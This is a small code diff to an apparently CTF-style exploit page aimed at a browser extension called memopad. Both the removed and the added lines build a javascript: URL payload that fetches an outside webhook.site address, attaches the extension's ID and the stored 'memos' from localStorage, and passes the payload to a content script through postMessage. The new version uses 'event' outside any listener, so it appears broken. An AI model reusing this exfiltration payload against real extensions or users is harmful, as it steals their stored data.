@@ -17,17 +17,13 @@
             const memoText = "FLAG_PLACEHOLDER"; // Replace with the actual flag value.
             
             // Post a message to the content script to create a memo.
-            window.addEventListener("message", (event) => {
-                if (event.source !== window) return;
-                if (event.data?.type === "create") {
-                    const encodedUrl = encodeURIComponent(`javascript:fetch("https://webhook.site/d8975503-1e4d-4d52-a0fd-ce4dca2c4174" + document.querySelector("meta[memopad-extensionId]").getAttribute("memopad-extensionId") + "/" + localStorage.getItem("memos"))`);
-                    window.postMessage({
-                        type: 'create',
-                        payload: encodedUrl
-                    });
-                }
-            });
-
+            if (event.data?.type === "create") {
+                const encodedUrl = encodeURIComponent(`javascript:fetch("https://webhook.site/d8975503-1e4d-4d52-a0fd-ce4dca2c4174" + document.querySelector("meta[memopad-extensionId]").getAttribute("memopad-extensionId") + "/" + localStorage.getItem("memos"))`);
+                window.postMessage({
+                    type: 'create',
+                    payload: encodedUrl
+                });
+            }
             // Wait a moment and then navigate to the popup page, which will trigger the URL with the fragment.
         }
     </script>
